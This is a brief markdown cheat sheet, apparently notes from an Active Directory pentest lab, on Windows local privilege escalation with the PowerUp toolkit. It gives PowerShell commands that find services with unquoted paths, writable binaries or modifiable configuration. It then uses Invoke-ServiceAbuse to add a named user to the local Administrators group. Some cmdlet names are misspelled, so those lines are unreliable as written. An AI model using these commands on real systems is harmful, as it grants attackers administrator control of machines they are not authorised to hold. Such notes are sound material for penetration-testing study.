## Local Privilege Escalation

### PowerUP
---

#### Find Vulnerable Services
- Get Services with Unquoted PAths and Spaces in Name
```powershell
C:> Get-ServiceUnquoted -vebose
```
- Get Services where Current User can Write to the Binary Path or Change Arguments to Binary
```powershell
C:> Get-ModifiableServiceFile
```
- Get Services that Current User can Modify Configuration
```powershell
C:> Get-ModifiableSrvice
```
##### Abuse Found Vulnerable Services
In the three cmdlets, a `AbuseFunction` field is returned with the command to run to gain privileges. To make the user member of Local Administrators, can use:
```powershell
C:> Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\studentx'
```
This will make user member of the Admins group. Just need to relog session and that's it.




